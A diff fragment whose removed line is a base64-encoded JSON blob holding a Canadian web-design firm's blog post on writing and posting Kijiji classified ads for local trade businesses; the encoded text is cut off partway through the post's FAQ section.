@@ -1,1 +1,235 @@
-{"data":"LS0tCnRpdGxlOiAiS2lqaWppIEFkcyBNYXJrZXRpbmcgdGhlIEJlc3QgU3RyYXRlZ3kgZm9yIExvY2FsIEJ1c2luZXNzZXMiCnNsdWc6ICJraWppamktYWRzLW1hcmtldGluZy1zdHJhdGVneS1mb3ItbG9jYWwtYnVzaW5lc3NlcyIKZGF0ZTogIjIwMjMtMTEtMTYiCmF1dGhvcjogIkNhbmFkaWFuIFdlYiBEZXNpZ25zIgpkZXNjcmlwdGlvbjogIktpamlqaSBBZHMgTWFya2V0aW5nIHRoZSBCZXN0IFN0cmF0ZWd5IGZvciBMb2NhbCBCdXNpbmVzc2VzIgprZXl3b3JkczogWyJraWppamkgYWRzIG1hcmtldGluZyBzdHJhdGVneSBmb3IgbG9jYWwgYnVzaW5lc3NlcyIsIkJsb2ciXQpjYXRlZ29yeTogIkJsb2ciCmZlYXR1cmVkSW1hZ2U6ICJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjEvMDIvVW50aXRsZWQtZGVzaWduLmpwZyIKLS0tCgo8cD5MZWFybiB0byBleHBhbmQgeW91ciBob21lIHNlcnZpY2UgYnVzaW5lc3MgYnkgdXNpbmcgdGhlIEtpamlqaSBtYXJrZXRpbmcgdG9vbC4gQ29ubmVjdCB5b3VyIGJyYW5kIHdpdGggdGhlIENhbmFkaWFuIGNvbW11bml0eSB0byBhdHRyYWN0IGxlYWRzIGFuZCBoaWtlIHVwIHlvdXIgc2FsZXMuIFRoaXMgYXJ0aWNsZSB3aWxsIGludHJvZHVjZSB5b3UgdG8gS2lqaWppIG1hcmtldGluZyBhbmQgYSBzdGVwLWJ5LXN0ZXAgZ3VpZGUgdG8gb3B0aW1pemluZyB5b3VyIEtpamlqaSBhZHMuIFNvLCBsZXTigJlzIGRpdmUgaW4hPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC13aGF0LWFyZS1raWppamktYWRzIj48c3Ryb25nPldoYXQgYXJlIEtpamlqaSBBZHM/PC9zdHJvbmc+PC9oMj4KCjxwPktpamlqaSBpcyBhIHdpZGVseSBrbm93biBvbmxpbmUgYWR2ZXJ0aXNpbmcgcGxhdGZvcm0sIGFuZCBpdOKAmXMgdGhlIGxhcmdlc3QgY2xhc3NpZmllZCBzaXRlIGluIENhbmFkYSwgd2l0aCBtaWxsaW9ucyBvZiBhZHMgaW4gYSB3aWRlIGFycmF5IG9mIGNhdGVnb3JpZXMuIEl0IGhlbHBzIENhbmFkaWFucywgZXNwZWNpYWxseSBvbiBtYXR0ZXJzIHdpdGggdGhlIHNraWxsZWQgdHJhZGVz4oCZIHZhcmlldHkgdW5kZXIgc2VydmljZXMuPC9wPgoKPHA+SW4gdG90YWwsIHRoZXJlIGFyZSA1MSwzMjUgS2lqaWppIEFkcyBpbiB0aGUgU2tpbGxlZCBUcmFkZXMgaW4gQ2FuYWRhIGFzIG9mIHdyaXRpbmcgdGhpcyBpbiBKdWx5IDIwMjAuIFRoZXNlIFNraWxsZWQgVHJhZGVzIGZvY3VzIG9uOjwvcD4KCjxkaXYgY2xhc3M9IndwLWJsb2NrLWNvbHVtbnMiPgo8ZGl2IGNsYXNzPSJ3cC1ibG9jay1jb2x1bW4iPgo8dWw+CjxsaT5SZW5vdmF0aW9uczwvbGk+Cgo8bGk+R2VuZXJhbCBDb250cmFjdGluZyAmYW1wOyBIYW5keW1hbjwvbGk+Cgo8bGk+TGF3biwgRmVuY2UgJmFtcDsgRGVjayBJbnN0YWxsYXRpb248L2xpPgoKPGxpPlRyZWUgTWFpbnRlbmFuY2UgJmFtcDsgRWF2ZXN0cm91Z2g8L2xpPgoKPGxpPlBhaW50ZXJzICZhbXA7IFBhaW50aW5nPC9saT4KCjxsaT5SYWlsaW5nICZhbXA7IFNpZGluZzwvbGk+Cgo8bGk+QnJpY2sgJmFtcDsgRmxvb3Jpbmc8L2xpPgoKPGxpPk1hc29ucnkgJmFtcDsgQ29uY3JldGU8L2xpPgoKPGxpPldlbGRpbmcgJmFtcDsgUm9vZmluZzwvbGk+Cgo8bGk+RXhjYXZhdGlvbiwgRGVtb2xpdGlvbiAmYW1wOyBXYXRlcnByb29maW5nPC9saT4KCjxsaT5JbnRlcmxvY2ssIFBhdmluZyAmYW1wOyBEcml2ZXdheXM8L2xpPgo8L3VsPgo8L2Rpdj4KCjxkaXYgY2xhc3M9IndwLWJsb2NrLWNvbHVtbiI+Cjx1bD4KPGxpPkhlYXRpbmcgJmFtcDsgUGx1bWJpbmc8L2xpPgoKPGxpPlZlbnRpbGF0aW9uICZhbXA7IEFpciBDb25kaXRpb25pbmc8L2xpPgoKPGxpPkVsZWN0cmljaWFuPC9saT4KCjxsaT5Ecnl3YWxsICZhbXA7IFN0dWNjbyBSZW1vdmFsPC9saT4KCjxsaT5Dcm93biBNb3VsZGluZyAmYW1wOyBUcmltIHdvcms8L2xpPgoKPGxpPkFwcGxpYW5jZSBSZXBhaXIgJmFtcDsgSW5zdGFsbGF0aW9uPC9saT4KCjxsaT5XaW5kb3dzICZhbXA7IERvb3JzIENhcnBlbnRyeTwvbGk+Cgo8bGk+U25vdyBSZW1vdmFsICZhbXA7IFByb3BlcnR5IE1haW50ZW5hbmNlPC9saT4KCjxsaT5UZWxlY29tbXVuaWNhdGlvbjwvbGk+Cgo8bGk+Q2FibGUgJmFtcDsgSG9tZS13aXJpbmc8L2xpPgoKPGxpPkluc3VsYXRpb24sIGFuZCBtb3JlLjwvbGk+CjwvdWw+CjwvZGl2Pgo8L2Rpdj4KCjxwPlRoZXNlIGFyZSBhIGxvdCBvZiBLaWppamkgYWRzISBJZiB0aGVyZSBhcmUgdGhpcyBtYW55PGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2Evd2hvLXdlLWFyZS8iPiBwZW9wbGUgYWR2ZXJ0aXNpbmc8L2E+LCBpdCBzaG93cyB0aGF0IHRoZXJlIGlzIG1vbmV5IHRvIGJlIG1hZGUgaGVyZSBhbmQgd2hvIHdvdWxkIG5vdCBhaW0gdG8gY2FwaXRhbGl6ZSBvbiBpdD88L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLXBsYWNlLWFkLW9uLWtpamlqaS13aHktYWR2ZXJ0aXNlLW9uLWtpamlqaSI+UGxhY2UgYWQgb24gS2lqaWppOiA8c3Ryb25nPldoeSBhZHZlcnRpc2Ugb24gS2lqaWppPzwvc3Ryb25nPjwvaDI+Cgo8cD5XaGV0aGVyIHlvdSBoYXZlIGEgbGFyZ2UgZXN0YWJsaXNoZWQgc2tpbGxlZCB0cmFkZSBidXNpbmVzcyBvciBqdXN0IHN0YXJ0aW5nIHlvdXIgY29uc3RydWN0aW9uIGNvbXBhbnksIHlvdSBORUVEIHRvIGJlIGluIEtpamlqaSB0byB3aWRlbiB5b3VyIGNvbW11bml0eS4gVGhlcmUgYXJlIHByb3ZlbiBtZXRob2RzIGFuZCBzdHJhdGVnaWVzIGZvciB3cml0aW5nIGEgS2lqaWppIGFkIHRoYXQgY29udmVydHMgdmlld3MgdG8gcGhvbmUgY2FsbHMuPC9wPgoKPHA+SGVyZSBhcmUgdGhlIHRhbmdpYmxlIGV4YW1wbGVzIG9mIHJlYWwgY29weXdyaXRpbmcgdGhhdCB5b3UgY2FuIGFwcGx5IHRvIHlvdXIgYnVzaW5lc3M6PC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1pbXBvcnRhbmNlLW9mLWtpamlqaS1wb3N0aW5nIj48c3Ryb25nPkltcG9ydGFuY2Ugb2YgS2lqaWppIHBvc3Rpbmc8L3N0cm9uZz48L2gyPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC0xLWFkLWNvbnRlbnQtdGhhdC1jb250YWlucy10aGUtZm9sbG93aW5nIj48c3Ryb25nPjEuIEFkIGNvbnRlbnQgdGhhdCBjb250YWlucyB0aGUgZm9sbG93aW5nOjwvc3Ryb25nPjwvaDM+Cgo8dWw+CjxsaT5UaXRsZTwvbGk+Cgo8bGk+RGVzY3JpcHRpb248L2xpPgoKPGxpPlRhZ3M8L2xpPgoKPGxpPkxvY2F0aW9uPC9saT4KCjxsaT5BZGRyZXNzPC9saT4KCjxsaT5QaWN0dXJlczwvbGk+Cgo8bGk+QSBZb3VUdWJlIHZpZGVvPC9saT4KCjxsaT5QaG9uZSBOdW1iZXI8L2xpPgoKPGxpPkNhc2hsZXNzIHBheW1lbnQgKG5ldyk8L2xpPgo8L3VsPgoKPHA+U3RhcnRpbmcgd2l0aCB0aGUgS2lqaWppIGFkIHRpdGxlLCB5b3UgbmVlZCB0byBlbnN1cmUgeW91IGFyZSBkZXNjcmliaW5nIHdoYXQgeW91IGRvIGluIDMtNCB3b3JkcyBvciBsZXNzLiBUaGVuIHB1dCBhIGNhbGwtdG8tYWN0aW9uIGFuZCBzZWN1cmUgdG8gcGxhY2UgeW91ciBudW1iZXIgb24gdGhlIGFkIHRpdGxlIGZvciBib3RoIHRoZSBjbGllbnQgYW5kIHlvdXIgY29udmVuaWVuY2UuIFNpbmNlIHlvdeKAmXZlIGJlZW4gZXllaW5nIHRvIGhhdmUgbW9yZSBjbGllbnRzLCB5b3UgY2Fu4oCZdCBsZXQgeW91ciBjbGllbnQgd2FzdGUgdGhlaXIgdGltZSB0cnlpbmcgdG8gZmluZCB5b3VyIHBob25lIG51bWJlciBpbiB0aGUgYWQuIFlvdSBnaXZlIHRoZSBwcm9zcGVjdHMgbW9yZSBjaGFuY2VzIHRvIGNhbGwgeW91LCB0aHVzIGltcHJvdmluZyB5b3VyIGNvbnZlcnNpb25zLjwvcD4KCjxwPkhlcmUgYXJlIHR3byBnb29kIGFkIHRpdGxlIGV4YW1wbGVzOjwvcD4KCjx1bD4KPGxpPjxhIGhyZWY9Imh0dHBzOi8vbWFyY29kZW1vbGl0aW9uLmNvbS8iPkRFTU9MSVRJT048L2E+fFdBVEVSUFJPT0ZJTkd8VU5ERVJQSU5OSU5HfCBDQUxMIDY0Ny14eHgteHh4eDwvbGk+Cgo8bGk+QmVzdCBQbHVtYmVyIGZvciBIaXJlIC0gTGljZW5zZWQgJmFtcDsgSW5zdXJlZCEgQ2FsbCA5MDUgeHh4IHh4eHg8L2xpPgo8L3VsPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC0yLXRhbGstYWJvdXQteW91ci1zZXJ2aWNlcyI+PHN0cm9uZz4yLiBUYWxrIGFib3V0IHlvdXIgc2VydmljZXM8L3N0cm9uZz48L2gzPgoKPHA+Jm5ic3A7TGlzdCBvdXQgYWxsIHRoZSBiZW5lZml0cyBvZiBldmVyeXRoaW5nIHlvdSBkbyBpbiBidWxsZXQgZm9ybSB0byBrZWVwIGl0IHN0cmFpZ2h0IHRvIHRoZSBwb2ludCBhbmQgY2FwdHVyZSBhbGwgdGhlIDxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhL2JsYWNrLWhhdC1zZW8tdnMtd2hpdGUtaGF0LXNlby8iPnNlYXJjaCA8L2E+dGVybXMgZnJvbSBLaWppamnigJlzIHNlYXJjaCBlbmdpbmUuIElmIHlvdXIgYWQgdGl0bGUgc2F5cyBob21lIHJlbm92YXRpb25zLCBidXQgdGhlIHByb3NwZWN0IHNlYXJjaGVzIGFyZSBmb3Iga2l0Y2hlbiByZW1vZGVsaW5nLCB5b3UgY2FuIHN0aWxsIGJlIGluIHNlYXJjaCBiZWNhdXNlIGl04oCZcyB3cml0dGVuIGluIHlvdXIgS2lqaWppIGFkIGRlc2NyaXB0aW9uLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtMy1saXN0LWRvd24teW91ci10YXJnZXQtY2l0aWVzIj48c3Ryb25nPjMuIExpc3QgZG93biB5b3VyIHRhcmdldCBjaXRpZXM8L3N0cm9uZz48L2gzPgoKPHA+V3JpdGUgZG93biBldmVyeSBzaW5nbGUgY2l0eSB5b3UgdGFyZ2V0IHRvIHNlcnZlIGluIGJ1bGxldCBwb2ludHM6PC9wPgoKPHA+Rm9yIGV4YW1wbGU6PC9wPgoKPGRpdiBjbGFzcz0id3AtYmxvY2stY29sdW1ucyI+CjxkaXYgY2xhc3M9IndwLWJsb2NrLWNvbHVtbiI+CjxwPuKXjyA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9zZW8vdG9yb250by8iPlRvcm9udG88L2E+PC9wPgoKPHA+4pePIE5vcnRoIFlvcms8L3A+Cgo8cD7il48gTWlzc2lzc2F1Z2E8L3A+Cgo8cD7il48gRXRvYmljb2tlPC9wPgo8L2Rpdj4KCjxkaXYgY2xhc3M9IndwLWJsb2NrLWNvbHVtbiI+CjxwPuKXjyBCcmFtcHRvbjwvcD4KCjxwPuKXjyBSaWNobW9uZCBIaWxsPC9wPgoKPHA+4pePIFRoZSByZXN0IG9mIEdUQTwvcD4KCjxwPuKXjyA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9zZW8vdmFuY291dmVyLyI+VmFuY291dmVyPC9hPjwvcD4KPC9kaXY+CjwvZGl2PgoKPHA+V3JpdGUgYSBzZWN0aW9uIGFib3V0IHdobyB5b3UgYXJlOiB5b3Vyc2VsZiwgeW91ciBjb21wYW55LCB5b3VyIHRlYW0sIHlvdXIgY29tcGFueeKAmXMgd2Vic2l0ZSwgeW91ciBwb3J0Zm9saW8sIHRydWNrcywgYW5kIG1vc3QgaW1wb3J0YW50bHksIHlvdXIgc2VsbGluZyBwb2ludHMuIEFsbCB0aGUgbmVlZGVkIGluZm9ybWF0aW9uIHdpbGwgZ2V0IHRoZSBwcm9zcGVjdCB0byBzdG9wIHJlYWRpbmcgYW5kIHBpY2sgdXAgdGhlIHBob25lIGFuZCBjYWxsIHlvdS4gRGlzY3VzcyBzZWxsaW5nIHBvaW50cyBzdWNoIGFzOjwvcD4KCjxwPuKXjyBBbGwgVGVjaG5pY2lhbnMgYXJlIEFMTCBDRVJUSUZJRUQ8L3A+Cgo8cD7il48gVFNTQSBwcmVmZXJyZWQgQ29udHJhY3RvcnM8L3A+Cgo8cD7il48gQWNjcmVkaXRlZCBieSBCZXR0ZXIgQnVzaW5lc3MgQnVyZWF1PC9wPgoKPHA+4pePICQyLDAwMCwwMDAtZG9sbGFyIGxpYWJpbGl0eSBpbnN1cmFuY2UsIGV0Yy48L3A+Cgo8cD5MYXN0bHksIGNsb3NlIHdpdGggYSBjYWxsIHRvIGFjdGlvbiB0byBnZXQgdGhlbSB0byBjYWxsIHlvdSBub3cuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1raWppamktYWR2ZXJ0aXNpbmctc3RyYXRlZ2llcyI+PHN0cm9uZz5LaWppamkgYWR2ZXJ0aXNpbmcgc3RyYXRlZ2llczwvc3Ryb25nPjwvaDI+Cgo8cD48c3Ryb25nPjEuIFBvc3QgeW91ciBLaWppamkgQWQgTW9yZSBPZnRlbjwvc3Ryb25nPiAtIFBvc3QgbW9yZSBvZnRlbiwgc3RheSBvbiB0b3AsIGFuZCBjb2xsZWN0IHRoZSBsZWFkcy4gQWx0ZXJuYXRpdmVseSwgeW91IGNhbiBwYXkgS2lqaWppIHRvIGtlZXAgb24gdG9wIGlmIHlvdSBoYXZlIGVub3VnaCBidWRnZXQgdG8gYXZhaWwgaXQuIFlvdSBjYW4gYWxzbyBvcHQgdG8gaGlyZSBhIHZpcnR1YWwgYXNzaXN0YW50IHRvIGRvIHRoZSBqb2IgZm9yIHlvdS48L3A+Cgo8cD48c3Ryb25nPjIuIFBvc3QgbW9yZSB0aGFuIG9uZSBLaWppamkgYWQ8L3N0cm9uZz4gLSBNb2RpZnkgeW91ciBhcHByb2FjaCB0byBhdHRyYWN0IGEgd2lkZSByYW5nZSBvZiB2aWV3ZXJzLiBBIGRpdmVyc2l0eSBpbiBhZCBjb250ZW50LCBpbWFnZXJ5LCBhbmQgc3R5bGUgY291bGQgZHJhdyBpbiBtYW55IHBvdGVudGlhbCBjbGllbnRzLjwvcD4KCjxwPjxzdHJvbmc+My4gUG9zdCB5b3VyIEtpamlqaSBhZCBpbiBtb3JlIHRoYW4gb25lIGNhdGVnb3J5PC9zdHJvbmc+IC0gWW91IGNhbiBldmVuIHB1c2ggdGhlIGJhciBmdXJ0aGVyIGFuZCBwb3N0IHRoZSBLaWppamkgYWQgaW50byB0aGUgb3RoZXIgY2xhc3MuPC9wPgoKPHA+PHN0cm9uZz40LiBQb3N0IHlvdXIgS2lqaWppIGFkIGluIG1vcmUgdGhhbiBvbmUgbG9jYXRpb248L3N0cm9uZz4gLSBZb3UgbXVzdCBjYXBpdGFsaXplIG9uIGFsbCBzdXJyb3VuZGluZyByZWdpb25zIHNlcGFyYXRlbHkuIEZhaWxpbmcgdG8gcG9zdCB5b3VyIEtpamlqaSBhZCBpbiB2YXJpb3VzIGFyZWFzIHdpbGwgZmFpbCB0byByZWFjaCBhIG11bHRpdHVkZSBvZiBwZW9wbGUuPC9wPgoKPHA+PHN0cm9uZz41LiBPcHRpbWl6ZSBLaWppamkgYWQgYW5kIHByb2ZpbGUgJmFtcDsgS2lqaWppIHJldmlld3M8L3N0cm9uZz4gLSBZb3UgbmVlZCB0byBjYXB0dXJlIGEgbmljaGUgb2YgdGhlIGNsaWVudHMgd2hvIGNsaWNrIG9uIHlvdXIgYWRzIHRocm91Z2ggZWZmZWN0aXZlIGtleXdvcmRzIGFuZCBwaHJhc2VzIHRoYXQgd2lsbCBrZWVwIHlvdXIgYXVkaWVuY2UgZW50aWNlZCBhbmQgY3VyaW91cyB0byBsZWFybiBtb3JlLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5VbnJhdmVsaW5nIHRoZSBNYWdpYyBvZiBLaWppamkgQWRzOiBUaGUgVWx0aW1hdGUgR3VpZGU8L3N0cm9uZz48L2gyPgoKPHA+SW4gdGhlIGV2ZXItZXZvbHZpbmcgZGlnaXRhbCB3b3JsZCwgY2xhc3NpZmllZCBhZHMgaGF2ZSBjYXJ2ZWQgYSB1bmlxdWUgc3BhY2UuIFdoaWxlIHRoZXJlIGFyZSBudW1lcm91cyBwbGF0Zm9ybXMgdG8gY2hvb3NlIGZyb20sIEtpamlqaSBzdGFuZHMgb3V0IGZvciBpdHMgc2ltcGxlIHlldCBlZmZlY3RpdmUgYXBwcm9hY2guIEtpamlqaSBBZHMgaGF2ZSBiZWNvbWUgc3lub255bW91cyB3aXRoIGxvY2FsIGJ1eWluZywgc2VsbGluZywgYW5kIHNlcnZpY2VzIGluIENhbmFkYS4gTGV0J3MgZGVsdmUgaW50byB0aGUgd29ybGQgb2YgS2lqaWppLCB1bmRlcnN0YW5kIGl0cyBmZWF0dXJlcywgYW5kIGV4cGxvcmUgaG93IHlvdSBjYW4gaGFybmVzcyBpdHMgZnVsbCBwb3RlbnRpYWwuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPldoYXQgTWFrZXMgS2lqaWppIEFkcyBTdGFuZCBPdXQ/PC9zdHJvbmc+PC9oMj4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+U2ltcGxpY2l0eSBhdCBpdHMgQmVzdDwvaDM+Cgo8dWw+CjxsaT48c3Ryb25nPkVhc2Ugb2YgVXNlOjwvc3Ryb25nPiBXaXRoIGEgdXNlci1mcmllbmRseSBpbnRlcmZhY2UsIHBvc3RpbmcgYW4gYWQgb24gS2lqaWppIGlzIHN0cmFpZ2h0Zm9yd2FyZC48L2xpPgoKPGxpPjxzdHJvbmc+TG9jYWwgVG91Y2g6PC9zdHJvbmc+IFVubGlrZSBtYW55IHBsYXRmb3JtcyB0aGF0IGNhdGVyIHRvIHZhc3QgYXVkaWVuY2VzLCBLaWppamkncyBsb2NhbCBmb2N1cyBlbnN1cmVzIHRoYXQgeW91ciBhZCByZWFjaGVzIHRoZSByaWdodCBwZW9wbGUgaW4geW91ciB2aWNpbml0eS48L2xpPgo8L3VsPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5BIFBsZXRob3JhIG9mIENhdGVnb3JpZXM8L2gzPgoKPHA+V2hldGhlciB5b3UgYXJlIHNlbGxpbmcgZnVybml0dXJlLCBvZmZlcmluZyB0dXRvcmluZywgb3IgbG9va2luZyBmb3IgYSBsb3N0IHBldCwgS2lqaWppIEFkcyBjb3ZlcnMgYW4gZXh0ZW5zaXZlIHJhbmdlIG9mIGNhdGVnb3JpZXMgdG8gY2F0ZXIgdG8gZGl2ZXJzZSBuZWVkcy48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+Q3JhZnRpbmcgdGhlIFBlcmZlY3QgS2lqaWppIEFkPC9zdHJvbmc+PC9oMj4KCjxwPjxzdHJvbmc+Q2xhcml0eSBpcyBLZXk6PC9zdHJvbmc+IFlvdXIgYWQgc2hvdWxkIGJlIGNsZWFyIGFuZCBjb25jaXNlLiBBIHBvdGVudGlhbCBidXllciBvciBzZXJ2aWNlIHNlZWtlciBzaG91bGQgdW5kZXJzdGFuZCB3aGF0IHlvdSdyZSBvZmZlcmluZyBqdXN0IGJ5IGdsYW5jaW5nIGF0IGl0LjwvcD4KCjxwPjxzdHJvbmc+VGhlIFBvd2VyIG9mIEltYWdlczwvc3Ryb25nPjogQSBwaWN0dXJlIGlzIHdvcnRoIGEgdGhvdXNhbmQgd29yZHMuIFVzZSBoaWdoLXF1YWxpdHkgaW1hZ2VzIHRvIG1ha2UgeW91ciBhZCBtb3JlIGFwcGVhbGluZy48L3A+Cgo8cD48c3Ryb25nPlByaWNlIGl0IFJpZ2h0PC9zdHJvbmc+OiBSZXNlYXJjaCBzaW1pbGFyIEtpamlqaSBBZHMgdG8gZW5zdXJlIHlvdXIgcHJpY2luZyBpcyBjb21wZXRpdGl2ZS4gVGhpcyB3aWxsIGluY3JlYXNlIHlvdXIgY2hhbmNlcyBvZiBtYWtpbmcgYSBzYWxlLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5Ib3cgTWFueSBBZHMgQ2FuIEkgUG9zdCBvbiBLaWppamk/PC9zdHJvbmc+PC9oMj4KCjxwPlBvc3RpbmcgYWRzIG9uIEtpamlqaSBpcyBhIGJyZWV6ZSwgYnV0IHRoZXJlIGFyZSBzb21lIGd1aWRlbGluZXMgeW91IHNob3VsZCBiZSBhd2FyZSBvZjo8L3A+Cgo8b2wgc3RhcnQ9IjEiIHN0eWxlPSJsaXN0LXN0eWxlLXR5cGU6MSI+CjxsaT48c3Ryb25nPlJlZ3VsYXIgVXNlcnM6PC9zdHJvbmc+IFlvdSBjYW4gcG9zdCB1cCB0byAyNSBhZHMgZm9yIGZyZWUuIEhvd2V2ZXIsIG9uY2UgeW91IGV4Y2VlZCB0aGlzIGxpbWl0LCBLaWppamkgbWlnaHQgcmVxdWlyZSB5b3UgdG8gcGF5IGZvciBhZGRpdGlvbmFsIGxpc3RpbmdzLjwvbGk+Cgo8bGk+PHN0cm9uZz5CdXNpbmVzcyBVc2Vyczo8L3N0cm9uZz4gSWYgeW91J3JlIHJ1bm5pbmcgYSBidXNpbmVzcywgS2lqaWppIGhhcyBkaWZmZXJlbnQgcGFja2FnZXMgdGFpbG9yZWQgZm9yIGJ1bGsgcG9zdGluZy4gSXQncyBhZHZpc2VkIHRvIGNoZWNrIHRoZWlyIG9mZmljaWFsIHNpdGUgZm9yIGN1cnJlbnQgcmF0ZXMgYW5kIGJlbmVmaXRzLjwvbGk+Cgo8bGk+PHN0cm9uZz5EdXBsaWNhdGUgQWRzOjwvc3Ryb25nPiBBdm9pZCBwb3N0aW5nIGR1cGxpY2F0ZSBhZHMgYXMgS2lqaWppJ3MgYWxnb3JpdGhtIG1pZ2h0IGZsYWcgdGhlbSwgd2hpY2ggY2FuIGxlYWQgdG8gcGVuYWx0aWVzIG9yIHN1c3BlbnNpb25zLjwvbGk+Cjwvb2w+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+TmF2aWdhdGluZyBDaGFsbGVuZ2VzIHdpdGggS2lqaWppIEFkczwvc3Ryb25nPjwvaDI+Cgo8cD48c3Ryb25nPkRlYWxpbmcgd2l0aCBTY2FtbWVyczwvc3Ryb25nPjogQWx3YXlzIGJlIGNhdXRpb3VzLiBJZiBhIGRlYWwgc291bmRzIHRvbyBnb29kIHRvIGJlIHRydWUsIGl0IHByb2JhYmx5IGlzLjxicj48c3Ryb25nPkNvbW11bmljYXRpb24gaXMgQ3J1Y2lhbDogPC9zdHJvbmc+TWFpbnRhaW4gb3BlbiBjb21tdW5pY2F0aW9uIHdpdGggcG90ZW50aWFsIGJ1eWVycy4gSGF2aW5nIHRoaXMgbGV2ZWwgb2YgY29uZmlkZW5jZSBtYWtlcyBidXNpbmVzcyBkZWFsaW5ncyBtb3JlIGxpa2VseSB0byBnbyBzbW9vdGhseS48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLW15LWtpamlqaS1hZHMiPjxzdHJvbmc+TXkgS2lqaWppIEFkczwvc3Ryb25nPjwvaDI+Cgo8cD5NYW5hZ2luZyB5b3VyIEtpamlqaSBBZHMgaXMgYSBzdHJhaWdodGZvcndhcmQgcHJvY2VzcyB0aHJvdWdoIHRoZSBNeSBLaWppamkgQWRzIHNlY3Rpb24gb24gdGhlIHBsYXRmb3JtLiBJbiB0aGlzIHVzZXItZnJpZW5kbHkgaW50ZXJmYWNlLCB5b3UgY2FuIGVhc2lseSBlZGl0LCB1cGRhdGUsIG9yIHJlbW92ZSB5b3VyIGFkcyBhcyBuZWVkZWQsIGVuc3VyaW5nIHRoZXkgcmVtYWluIGFjY3VyYXRlIGFuZCBlZmZlY3RpdmUuIFlvdSBjYW4gYWxzbyBtb25pdG9yIHRoZSBwZXJmb3JtYW5jZSBvZiB5b3VyIGFkcywgdHJhY2sgdmlld3MsIGFuZCByZXNwb25kIHRvIGlucXVpcmllcyBmcm9tIHBvdGVudGlhbCBidXllcnMsIGFsbCBmcm9tIG9uZSBjb252ZW5pZW50IGxvY2F0aW9uLiBNeSBLaWppamkgQWRzIGlzIHlvdXIgY2VudHJhbCBodWIgZm9yIG9wdGltaXppbmcgeW91ciBsaXN0aW5ncyBhbmQgZW5zdXJpbmcgYSBzdWNjZXNzZnVsIHNlbGxpbmcgZXhwZXJpZW5jZSBvbiB0aGUgcGxhdGZvcm0uPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkZBUXM8L3N0cm9uZz48L2gyPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1ob3ctZG8taS1lbmhhbmNlLXRoZS12aXNpYmlsaXR5LW9mLW15LWtpamlqaS1hZHMiPjxzdHJvbmc+SG93IGRvIEkgZW5oYW5jZSB0aGUgdmlzaWJpbGl0eSBvZiBteSBLaWppamkgQWRzPzwvc3Ryb25nPiA8L2gzPgoKPHA+VG8gZW5oYW5jZSB0aGUgdmlzaWJpbGl0eSBvZiB5b3VyIEtpamlqaSBBZHMsIHlvdSBzaG91bGQgdGFrZSBhIG11bHRpZmFjZXRlZCBhcHByb2FjaC4gSW4gYWRkaXRpb24gdG8gb3B0aW5nIGZvciBwcmVtaXVtIGxpc3Rpbmcgb3B0aW9ucywgZm9jdXMgb24gb3B0aW1pemluZyB5b3VyIGFkIGNvbnRlbnQgYnkgY3JhZnRpbmcgYSBjb21wZWxsaW5nIHRpdGxlLCBwcm92aWRpbmcgYSBkZXRhaWxlZCBkZXNjcmlwdGlvbiwgYW5kIGluY2x1ZGluZyBoaWdoLXF1YWxpdHkgaW1hZ2VzLiBFbnN1cmUgeW91ciBwcmljaW5nIGlzIGNvbXBldGl0aXZlLCBzZWxlY3QgdGhlIG1vc3QgcmVsZXZhbnQgY2F0ZWdvcnkgYW5kIGF0dHJpYnV0ZXMsIGFuZCByZWZyZXNoIHlvdXIgYWRzIHBlcmlvZGljYWxseSB0byBtYWludGFpbiBhIHByb21pbmVudCBwb3NpdGlvbiBpbiBzZWFyY2ggcmVzdWx0cy4gSW5jb3Jwb3JhdGUgYXBwcm9wcmlhdGUga2V5d29yZHMsIHJlc3BvbmQgcHJvbXB0bHkgdG8gaW5xdWlyaWVzLCBhbmQgbGV2ZXJhZ2Ugc29jaWFsIG1lZGlhIGZvciBwcm9tb3Rpb24uIEV4cGxvcmUgZmVhdHVyZWQgYWQgb3B0aW9ucyBhbmQgcHJpb3JpdGl6ZSBleGNlbGxlbnQgY3VzdG9tZXIgc2VydmljZSB0byBidWlsZCBhIHBvc2l0aXZlIHJlcHV0YXRpb24uIEFsd2F5cyBhZGhlcmUgdG8gS2lqaWppJ3MgZ3VpZGVsaW5lcyBhbmQgbW9uaXRvciB5b3VyIGFkJ3MgcGVyZm9ybWFuY2UgdXNpbmcgdGhlaXIgYW5hbHl0aWNzIHRvb2xzIHRvIG1ha2UgbmVjZXNzYXJ5IGltcHJvdmVtZW50cy48L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLWFyZS10aGVyZS1hbnktcmVzdHJpY3Rpb25zLW9uLXRoZS10eXBlLW9m